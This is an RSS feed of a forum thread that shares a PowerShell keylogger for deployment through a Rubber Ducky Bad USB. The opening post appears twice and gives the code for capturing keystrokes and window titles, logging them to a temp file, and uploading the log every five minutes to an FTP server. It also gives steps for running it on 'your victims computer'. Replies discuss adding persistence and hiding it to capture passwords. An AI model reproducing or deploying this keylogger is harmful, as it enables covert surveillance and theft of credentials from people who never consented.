@@ -1,0 +1,428 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Plug In To Win - Powershell Keylogger [Part 2/3]</title>
+    <link>https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158</link>
+    <description>Hey Mates!
+
+As promised I share a Powershell Keylogger with you, which can be used together with our Bad USB to be installed within just some seconds of physical access :slight_smile:.
+
+This keylogger is not completly written by me! I used several ones on the internet and modified them to fit my needs :wink:. The original ones can be found here:
+
+- [Powershell Keystroke Logger](https://vacmf.org/2013/01/23/powershell-keylogger/)
+- [Powersploit Keylogger Module](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)
+
+I never worked with Powershell before and  haven&#39;t read any tutorials on it, but the language is that easy, that I could understand and modify the script without any problems! I think that&#39;s the real beauty of this language :wink:.
+
+---
+## Powershell
+Before we dive into the code I should give you a small introduction to the language we&#39;re using. 
+
+Powershell is an attempt of Microsoft to connect the main characteristics of the Unix-Shell with object-oriented languages. It has two great advantages:
+
+- Very easy, due to the ridiculous simple syntax
+- Integrated into Windows since Vista
+
+These are the reasons, why it can be used as a great Post-exploitation framework, although it isn&#39;t made for it :smile:. We can use it perfectly for the Rubber Ducky, because it has a shell for typing in commands directly through the keyboard and it supports powerful scripts.
+
+---
+## Keylogger Script
+Here I&#39;ll explain my script to you, so that you can understand it without the knowledge of programming languages. I won&#39;t cover the basics of Powershell scripting here, because they aren&#39;t necessary for using it, but if you&#39;re interested in some tutorials on it, so that you can write your own powerful scripts, just ask in the comments :slight_smile:.
+
+### The Setup
+I won&#39;t talk about the first lines in detail, because that would go beyond the scope of this tutorial. You just have to know that they set up the keycodes and import the required DLLs.
+
+We directly jump to line 157, because here begins the real action :wink:.
+
+### The Main Routine
+```
+    while ($true) {
+        Start-Sleep -Milliseconds 40
+        $gotit = &quot;&quot;
+
+        for ($char = 1; $char -le 254; $char++) {
+            $vkey = $char
+            $gotit = $getKeyState::GetAsyncKeyState($vkey)
+
+            if ($gotit -eq -32767) {
+
+                $EnterKey = $getKeyState::GetAsyncKeyState(13)
+                $TabKey = $getKeyState::GetAsyncKeyState(9)
+                $DeleteKey = $getKeyState::GetAsyncKeyState(46)
+                $BackSpaceKey = $getKeyState::GetAsyncKeyState(8)
+                $LeftArrow = $getKeyState::GetAsyncKeyState(37)
+                $UpArrow = $getKeyState::GetAsyncKeyState(38)
+                $RightArrow = $getKeyState::GetAsyncKeyState(39)
+                $DownArrow = $getKeyState::GetAsyncKeyState(40)
+
+                $caps_lock = [console]::CapsLock
+
+                $scancode = $getKey::MapVirtualKey($vkey, $MAPVK_VSC_TO_VK_EX)
+
+                $kbstate = New-Object Byte[] 256
+                $checkkbstate = $getKBState::GetKeyboardState($kbstate)
+                ...
+```
+This first part gets the current pressed keys and tests them for special keys.
+
+```
+                $TopWindow = $getForeground::GetForegroundWindow()
+                $WindowTitle = (Get-Process | Where-Object { $_.MainWindowHandle -eq $TopWindow }).MainWindowTitle
+
+                $LogOutput = &quot;`&quot;&quot; + $WindowTitle + &quot;`&quot;`t`t`t&quot;
+
+                $mychar = New-Object -TypeName &quot;System.Text.StringBuilder&quot;;
+                $unicode_res = $getUnicode::ToUnicode($vkey, $scancode, $kbstate, $mychar, $mychar.Capacity, 0)
+
+                $LogOutput += $mychar.ToString();
+                
+                if ($EnterKey)     {$LogOutput += &#39;[ENTER]&#39;}
+                if ($TabKey)       {$LogOutput += &#39;[Tab]&#39;}
+                if ($DeleteKey)    {$LogOutput += &#39;[Delete]&#39;}
+                if ($BackSpaceKey) {$LogOutput += &#39;[Backspace]&#39;}
+                if ($LeftArrow)    {$LogOutput += &#39;[Left Arrow]&#39;}
+                if ($RightArrow)   {$LogOutput += &#39;[Right Arrow]&#39;}
+                if ($UpArrow)      {$LogOutput += &#39;[Up Arrow]&#39;}
+                if ($DownArrow)    {$LogOutput += &#39;[Down Arrow]&#39;}
+
+                $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
+                $LogOutput += &quot;`t`t`t`t`t&quot; + $TimeStamp
+                
+                if ($unicode_res -gt 0) {
+                    $logfile = &quot;$env:temp\key.log&quot;
+                    $LogOutput | Out-File -FilePath $logfile -Append
+                }
+```
+Then the current active window is checked and added to the LogOutput-string. Also all pressed special keys and chars are added to the string. Finally a timestamp is appended and the string is written to `%TEMP%\key.log`.
+
+```
+Start-Job { 
+
+    # Config
+    $Username = &quot;YourUsername&quot;
+    $Password = &quot;YourPassword&quot;
+    $LocalFile = &quot;$env:temp\key.log&quot;
+    $RemoteFile = &quot;ftp://example.net/Log.txt&quot;
+    $SleepTime = 300
+ 
+    while (1 -eq 1)
+    {
+        # Sleep for specified time
+        Start-Sleep -Seconds $SleepTime
+
+        # Create FTP Rquest Object
+        $FTPRequest = [System.Net.FtpWebRequest]::Create(&quot;$RemoteFile&quot;)
+        $FTPRequest = [System.Net.FtpWebRequest]$FTPRequest
+        $FTPRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+        $FTPRequest.Credentials = new-object System.Net.NetworkCredential($Username, $Password)
+        $FTPRequest.UseBinary = $true
+        $FTPRequest.UsePassive = $true
+
+        # Read the File for Upload
+        $FileContent = gc -en byte $LocalFile
+        $FTPRequest.ContentLength = $FileContent.Length
+
+        # Get Stream Request by bytes
+        $Run = $FTPRequest.GetRequestStream()
+        $Run.Write($FileContent, 0, $FileContent.Length)
+
+        # Cleanup
+        $Run.Close()
+        $Run.Dispose()
+    }
+}
+```
+In the last part a background job is started, which sends the file every 5 mins to the specified FTP-Server.
+
+Hold in mind that this keylogger is **not persistent!** After a reboot it won&#39;t run again without further implementation.
+
+### The Full Script
+[Here&#39;s](http://pastebin.com/hhjbTmYk) the full script, so that it&#39;s easier to copy it :slight_smile:.
+
+## How To Combine It With The Rubber Ducky
+First you&#39;ll have to setup some required stuff to get things working.
+
+### Get A Server
+We&#39;ll need a server for hosting the keylogger and writing the log to. I recommend to use a free one, e.g. [bplaced.net](http://bplaced.net). I won&#39;t cover how to set it up, because that&#39;s as easy as creating an account :wink:.
+
+Of course you can set up your own one on your computer, but hold in mind that it can be easily spotted in the code of the keylogger.
+
+When you&#39;re finished, upload the keylogger to the server. 
+
+### DuckyScript
+Now change the server in the DuckyScript to your new one and install the script on your Bad USB.
+
+## Step-by-Step Tutorial
+Here&#39;s my step-by-step tutorial on how to use your Rubber Ducky now for running the keylogger on your victims computer.
+
+**Step 1:** Plug in the Rubber Ducky
+**Step 2:** Feel 1337
+
+## Conclusion
+With some simple scripting we can build our own keylogger, which can be easily run from our Bad USB.
+
+If you like to you can add persistence to the keylogger. That shouldn&#39;t be too hard :wink:.
+
+|-TheDoctor-|</description>
+    
+    <lastBuildDate>Sun, 02 Oct 2016 16:14:58 +0000</lastBuildDate>
+    <category>Malware</category>
+    <atom:link href="https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Plug In To Win - Powershell Keylogger [Part 2/3]</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
+          <p><a href="https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158/10">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158/10</link>
+        <pubDate>Sun, 21 Jan 2018 00:42:21 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-1158-10</guid>
+        <source url="https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158.rss">Plug In To Win - Powershell Keylogger [Part 2/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - Powershell Keylogger [Part 2/3]</title>
+        <dc:creator><![CDATA[Derfloink]]></dc:creator>
+        <description><![CDATA[
+            <p>Well then I do this. Maybe it’s an good excesise to do. But first I must wait that my exchange student is away, because it isn’t nice to program when he is there. I only have time because he’s sleeping in the car and I’m using my mobile.</p>
+          <p><a href="https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158/9">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158/9</link>
+        <pubDate>Sun, 02 Oct 2016 16:14:58 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-1158-9</guid>
+        <source url="https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158.rss">Plug In To Win - Powershell Keylogger [Part 2/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - Powershell Keylogger [Part 2/3]</title>
+        <dc:creator><![CDATA[TheDoctor]]></dc:creator>
+        <description><![CDATA[
+            <p>Nope, I won’t implement it. Do it on your own, it’s much eaier than you may think…</p>
+          <p><a href="https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158/8">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158/8</link>
+        <pubDate>Sun, 02 Oct 2016 15:51:27 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-1158-8</guid>
+        <source url="https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158.rss">Plug In To Win - Powershell Keylogger [Part 2/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - Powershell Keylogger [Part 2/3]</title>
+        <dc:creator><![CDATA[Derfloink]]></dc:creator>
+        <description><![CDATA[
+            <p>Ok I hope you will have it in some time.</p>
+          <p><a href="https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158/7">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158/7</link>
+        <pubDate>Sun, 02 Oct 2016 15:45:30 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-1158-7</guid>
+        <source url="https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158.rss">Plug In To Win - Powershell Keylogger [Part 2/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - Powershell Keylogger [Part 2/3]</title>
+        <dc:creator><![CDATA[TheDoctor]]></dc:creator>
+        <description><![CDATA[
+            <p>That would be a very basic version of persistence, which can be easily implemented. I haven’t already included it, because I don’t want to get spammed by the computer. Just get one important password and then it’s automatically offline. Both have pros and cons <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">.</p>
+          <p><a href="https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158/6">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158/6</link>
+        <pubDate>Sun, 02 Oct 2016 15:43:44 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-1158-6</guid>
+        <source url="https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158.rss">Plug In To Win - Powershell Keylogger [Part 2/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - Powershell Keylogger [Part 2/3]</title>
+        <dc:creator><![CDATA[Derfloink]]></dc:creator>
+        <description><![CDATA[
+            <p>Nice stuff <img src="https://0x00sec.org/images/emoji/twitter/heart_eyes.png?v=9" title=":heart_eyes:" class="emoji" alt=":heart_eyes:"> I’m thinking about buying this USB rubber ducky as I said to you last time. Can’t this script can be downloaded in autostart? If yes the computer can reboot and it’s still working. But you must remember the hide function or it can be seen easiely by the user. If this doesn’t work with hiding forget this. <img src="https://0x00sec.org/images/emoji/twitter/relaxed.png?v=9" title=":relaxed:" class="emoji" alt=":relaxed:"></p>
+          <p><a href="https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158/5">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158/5</link>
+        <pubDate>Sun, 02 Oct 2016 15:17:59 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-1158-5</guid>
+        <source url="https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158.rss">Plug In To Win - Powershell Keylogger [Part 2/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - Powershell Keylogger [Part 2/3]</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>That’s odd. The .NET doesn’t have an effect on the CPU with an infinite while loop. Must be some kind of optimization thing that C-compiled native binary lacks.</p>
+          <p><a href="https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158/4</link>
+        <pubDate>Sun, 02 Oct 2016 10:39:01 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-1158-4</guid>
+        <source url="https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158.rss">Plug In To Win - Powershell Keylogger [Part 2/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - Powershell Keylogger [Part 2/3]</title>
+        <dc:creator><![CDATA[TheDoctor]]></dc:creator>
+        <description><![CDATA[
+            <p>The PowerSploit script used around 20(!)% CPU power and had many mistakes, like keys were saved more than one time, etc… I used <a href="https://vacmf.org/2013/01/23/powershell-keylogger/" rel="noopener nofollow ugc">this</a> one as base, which was much better. After my modifications it just used 0-0.3% CPU power, which is pretty good - in my oppinion <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">.<br>
+<img src="//0x00sec.s3.amazonaws.com/original/2X/5/5c096f6990da3a7f950063357ea0f00079b0404e.PNG" width="529" height="27"></p>
+          <p><a href="https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158/3</link>
+        <pubDate>Sun, 02 Oct 2016 10:21:39 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-1158-3</guid>
+        <source url="https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158.rss">Plug In To Win - Powershell Keylogger [Part 2/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - Powershell Keylogger [Part 2/3]</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>Nice work. I remember using the <code>GetAsyncKeyState</code> function with the polling method, it’s pretty old and dates back to WinXP. One of the main reasons why I stopped using that technique was because of the CPU drainage while polling for keys which was incredibly noisy so I must ask, how well does it perform under PowerShell?</p>
+          <p><a href="https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158/2</link>
+        <pubDate>Sun, 02 Oct 2016 10:03:21 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-1158-2</guid>
+        <source url="https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158.rss">Plug In To Win - Powershell Keylogger [Part 2/3]</source>
+      </item>
+      <item>
+        <title>Plug In To Win - Powershell Keylogger [Part 2/3]</title>
+        <dc:creator><![CDATA[TheDoctor]]></dc:creator>
+        <description><![CDATA[
+            <p>Hey Mates!</p>
+<p>As promised I share a Powershell Keylogger with you, which can be used together with our Bad USB to be installed within just some seconds of physical access <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:">.</p>
+<p>This keylogger is not completly written by me! I used several ones on the internet and modified them to fit my needs <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">. The original ones can be found here:</p>
+<ul>
+<li><a href="https://vacmf.org/2013/01/23/powershell-keylogger/" rel="nofollow noopener">Powershell Keystroke Logger</a></li>
+<li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1" rel="nofollow noopener">Powersploit Keylogger Module</a></li>
+</ul>
+<p>I never worked with Powershell before and  haven’t read any tutorials on it, but the language is that easy, that I could understand and modify the script without any problems! I think that’s the real beauty of this language <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">.</p>
+<hr>
+<h2>Powershell</h2>
+<p>Before we dive into the code I should give you a small introduction to the language we’re using.</p>
+<p>Powershell is an attempt of Microsoft to connect the main characteristics of the Unix-Shell with object-oriented languages. It has two great advantages:</p>
+<ul>
+<li>Very easy, due to the ridiculous simple syntax</li>
+<li>Integrated into Windows since Vista</li>
+</ul>
+<p>These are the reasons, why it can be used as a great Post-exploitation framework, although it isn’t made for it <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:">. We can use it perfectly for the Rubber Ducky, because it has a shell for typing in commands directly through the keyboard and it supports powerful scripts.</p>
+<hr>
+<h2>Keylogger Script</h2>
+<p>Here I’ll explain my script to you, so that you can understand it without the knowledge of programming languages. I won’t cover the basics of Powershell scripting here, because they aren’t necessary for using it, but if you’re interested in some tutorials on it, so that you can write your own powerful scripts, just ask in the comments <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:">.</p>
+<h3>The Setup</h3>
+<p>I won’t talk about the first lines in detail, because that would go beyond the scope of this tutorial. You just have to know that they set up the keycodes and import the required DLLs.</p>
+<p>We directly jump to line 157, because here begins the real action <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">.</p>
+<h3>The Main Routine</h3>
+<pre><code class="lang-auto">    while ($true) {
+        Start-Sleep -Milliseconds 40
+        $gotit = ""
+
+        for ($char = 1; $char -le 254; $char++) {
+            $vkey = $char
+            $gotit = $getKeyState::GetAsyncKeyState($vkey)
+
+            if ($gotit -eq -32767) {
+
+                $EnterKey = $getKeyState::GetAsyncKeyState(13)
+                $TabKey = $getKeyState::GetAsyncKeyState(9)
+                $DeleteKey = $getKeyState::GetAsyncKeyState(46)
+                $BackSpaceKey = $getKeyState::GetAsyncKeyState(8)
+                $LeftArrow = $getKeyState::GetAsyncKeyState(37)
+                $UpArrow = $getKeyState::GetAsyncKeyState(38)
+                $RightArrow = $getKeyState::GetAsyncKeyState(39)
+                $DownArrow = $getKeyState::GetAsyncKeyState(40)
+
+                $caps_lock = [console]::CapsLock
+
+                $scancode = $getKey::MapVirtualKey($vkey, $MAPVK_VSC_TO_VK_EX)
+
+                $kbstate = New-Object Byte[] 256
+                $checkkbstate = $getKBState::GetKeyboardState($kbstate)
+                ...
+</code></pre>
+<p>This first part gets the current pressed keys and tests them for special keys.</p>
+<pre><code class="lang-auto">                $TopWindow = $getForeground::GetForegroundWindow()
+                $WindowTitle = (Get-Process | Where-Object { $_.MainWindowHandle -eq $TopWindow }).MainWindowTitle
+
+                $LogOutput = "`"" + $WindowTitle + "`"`t`t`t"
+
+                $mychar = New-Object -TypeName "System.Text.StringBuilder";
+                $unicode_res = $getUnicode::ToUnicode($vkey, $scancode, $kbstate, $mychar, $mychar.Capacity, 0)
+
+                $LogOutput += $mychar.ToString();
+                
+                if ($EnterKey)     {$LogOutput += '[ENTER]'}
+                if ($TabKey)       {$LogOutput += '[Tab]'}
+                if ($DeleteKey)    {$LogOutput += '[Delete]'}
+                if ($BackSpaceKey) {$LogOutput += '[Backspace]'}
+                if ($LeftArrow)    {$LogOutput += '[Left Arrow]'}
+                if ($RightArrow)   {$LogOutput += '[Right Arrow]'}
+                if ($UpArrow)      {$LogOutput += '[Up Arrow]'}
+                if ($DownArrow)    {$LogOutput += '[Down Arrow]'}
+
+                $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
+                $LogOutput += "`t`t`t`t`t" + $TimeStamp
+                
+                if ($unicode_res -gt 0) {
+                    $logfile = "$env:temp\key.log"
+                    $LogOutput | Out-File -FilePath $logfile -Append
+                }
+</code></pre>
+<p>Then the current active window is checked and added to the LogOutput-string. Also all pressed special keys and chars are added to the string. Finally a timestamp is appended and the string is written to <code>%TEMP%\key.log</code>.</p>
+<pre><code class="lang-auto">Start-Job { 
+
+    # Config
+    $Username = "YourUsername"
+    $Password = "YourPassword"
+    $LocalFile = "$env:temp\key.log"
+    $RemoteFile = "ftp://example.net/Log.txt"
+    $SleepTime = 300
+ 
+    while (1 -eq 1)
+    {
+        # Sleep for specified time
+        Start-Sleep -Seconds $SleepTime
+
+        # Create FTP Rquest Object
+        $FTPRequest = [System.Net.FtpWebRequest]::Create("$RemoteFile")
+        $FTPRequest = [System.Net.FtpWebRequest]$FTPRequest
+        $FTPRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+        $FTPRequest.Credentials = new-object System.Net.NetworkCredential($Username, $Password)
+        $FTPRequest.UseBinary = $true
+        $FTPRequest.UsePassive = $true
+
+        # Read the File for Upload
+        $FileContent = gc -en byte $LocalFile
+        $FTPRequest.ContentLength = $FileContent.Length
+
+        # Get Stream Request by bytes
+        $Run = $FTPRequest.GetRequestStream()
+        $Run.Write($FileContent, 0, $FileContent.Length)
+
+        # Cleanup
+        $Run.Close()
+        $Run.Dispose()
+    }
+}
+</code></pre>
+<p>In the last part a background job is started, which sends the file every 5 mins to the specified FTP-Server.</p>
+<p>Hold in mind that this keylogger is <strong>not persistent!</strong> After a reboot it won’t run again without further implementation.</p>
+<h3>The Full Script</h3>
+<p><a href="http://pastebin.com/hhjbTmYk" rel="nofollow noopener">Here’s</a> the full script, so that it’s easier to copy it <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:">.</p>
+<h2>How To Combine It With The Rubber Ducky</h2>
+<p>First you’ll have to setup some required stuff to get things working.</p>
+<h3>Get A Server</h3>
+<p>We’ll need a server for hosting the keylogger and writing the log to. I recommend to use a free one, e.g. <a href="http://bplaced.net" rel="nofollow noopener">bplaced.net</a>. I won’t cover how to set it up, because that’s as easy as creating an account <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">.</p>
+<p>Of course you can set up your own one on your computer, but hold in mind that it can be easily spotted in the code of the keylogger.</p>
+<p>When you’re finished, upload the keylogger to the server.</p>
+<h3>DuckyScript</h3>
+<p>Now change the server in the DuckyScript to your new one and install the script on your Bad USB.</p>
+<h2>Step-by-Step Tutorial</h2>
+<p>Here’s my step-by-step tutorial on how to use your Rubber Ducky now for running the keylogger on your victims computer.</p>
+<p><strong>Step 1:</strong> Plug in the Rubber Ducky<br>
+<strong>Step 2:</strong> Feel 1337</p>
+<h2>Conclusion</h2>
+<p>With some simple scripting we can build our own keylogger, which can be easily run from our Bad USB.</p>
+<p>If you like to you can add persistence to the keylogger. That shouldn’t be too hard <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">.</p>
+<p>|-TheDoctor-|</p>
+          <p><a href="https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158/1</link>
+        <pubDate>Sun, 02 Oct 2016 09:42:26 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-1158-1</guid>
+        <source url="https://d.clarkee.co.uk/t/plug-in-to-win-powershell-keylogger-part-2-3/1158.rss">Plug In To Win - Powershell Keylogger [Part 2/3]</source>
+      </item>
+  </channel>
+</rss>
